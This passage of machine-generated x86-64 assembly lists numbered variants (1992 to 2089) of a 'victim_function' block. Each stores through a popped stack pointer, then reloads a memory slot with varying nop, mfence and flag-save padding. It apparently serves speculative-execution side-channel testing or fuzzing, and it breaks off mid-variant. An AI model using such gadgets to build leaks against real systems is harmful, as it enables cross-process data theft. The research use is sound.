.Lvictim_function_win0_var1992:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1993
.Lvictim_function_win0_var1993:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1994
.Lvictim_function_win0_var1994:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1995
.Lvictim_function_win0_var1995:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1996
.Lvictim_function_win0_var1996:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1997
.Lvictim_function_win0_var1997:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1998
.Lvictim_function_win0_var1998:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1999
.Lvictim_function_win0_var1999:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2000
.Lvictim_function_win0_var2000:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2001
.Lvictim_function_win0_var2001:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2002
.Lvictim_function_win0_var2002:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	nop
	nop
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2003
.Lvictim_function_win0_var2003:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2004
.Lvictim_function_win0_var2004:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2005
.Lvictim_function_win0_var2005:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2006
.Lvictim_function_win0_var2006:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2007
.Lvictim_function_win0_var2007:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2008
.Lvictim_function_win0_var2008:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2009
.Lvictim_function_win0_var2009:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2010
.Lvictim_function_win0_var2010:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2011
.Lvictim_function_win0_var2011:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2012
.Lvictim_function_win0_var2012:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2013
.Lvictim_function_win0_var2013:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2014
.Lvictim_function_win0_var2014:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2015
.Lvictim_function_win0_var2015:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2016
.Lvictim_function_win0_var2016:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2017
.Lvictim_function_win0_var2017:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2018
.Lvictim_function_win0_var2018:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2019
.Lvictim_function_win0_var2019:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2020
.Lvictim_function_win0_var2020:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2021
.Lvictim_function_win0_var2021:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2022
.Lvictim_function_win0_var2022:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2023
.Lvictim_function_win0_var2023:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2024
.Lvictim_function_win0_var2024:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2025
.Lvictim_function_win0_var2025:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2026
.Lvictim_function_win0_var2026:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2027
.Lvictim_function_win0_var2027:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2028
.Lvictim_function_win0_var2028:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2029
.Lvictim_function_win0_var2029:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2030
.Lvictim_function_win0_var2030:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2031
.Lvictim_function_win0_var2031:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2032
.Lvictim_function_win0_var2032:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2033
.Lvictim_function_win0_var2033:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2034
.Lvictim_function_win0_var2034:
	popq	%rax
	nop
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2035
.Lvictim_function_win0_var2035:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2036
.Lvictim_function_win0_var2036:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2037
.Lvictim_function_win0_var2037:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2038
.Lvictim_function_win0_var2038:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2039
.Lvictim_function_win0_var2039:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2040
.Lvictim_function_win0_var2040:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2041
.Lvictim_function_win0_var2041:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2042
.Lvictim_function_win0_var2042:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2043
.Lvictim_function_win0_var2043:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2044
.Lvictim_function_win0_var2044:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2045
.Lvictim_function_win0_var2045:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2046
.Lvictim_function_win0_var2046:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2047
.Lvictim_function_win0_var2047:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2048
.Lvictim_function_win0_var2048:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2049
.Lvictim_function_win0_var2049:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2050
.Lvictim_function_win0_var2050:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2051
.Lvictim_function_win0_var2051:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2052
.Lvictim_function_win0_var2052:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2053
.Lvictim_function_win0_var2053:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2054
.Lvictim_function_win0_var2054:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2055
.Lvictim_function_win0_var2055:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2056
.Lvictim_function_win0_var2056:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2057
.Lvictim_function_win0_var2057:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2058
.Lvictim_function_win0_var2058:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2059
.Lvictim_function_win0_var2059:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2060
.Lvictim_function_win0_var2060:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2061
.Lvictim_function_win0_var2061:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2062
.Lvictim_function_win0_var2062:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2063
.Lvictim_function_win0_var2063:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2064
.Lvictim_function_win0_var2064:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2065
.Lvictim_function_win0_var2065:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2066
.Lvictim_function_win0_var2066:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2067
.Lvictim_function_win0_var2067:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2068
.Lvictim_function_win0_var2068:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2069
.Lvictim_function_win0_var2069:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2070
.Lvictim_function_win0_var2070:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2071
.Lvictim_function_win0_var2071:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2072
.Lvictim_function_win0_var2072:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2073
.Lvictim_function_win0_var2073:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2074
.Lvictim_function_win0_var2074:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2075
.Lvictim_function_win0_var2075:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2076
.Lvictim_function_win0_var2076:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2077
.Lvictim_function_win0_var2077:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2078
.Lvictim_function_win0_var2078:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2079
.Lvictim_function_win0_var2079:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2080
.Lvictim_function_win0_var2080:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2081
.Lvictim_function_win0_var2081:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2082
.Lvictim_function_win0_var2082:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2083
.Lvictim_function_win0_var2083:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2084
.Lvictim_function_win0_var2084:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2085
.Lvictim_function_win0_var2085:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2086
.Lvictim_function_win0_var2086:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2087
.Lvictim_function_win0_var2087:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2088
.Lvictim_function_win0_var2088:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2089
.Lvictim_function_win0_var2089:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
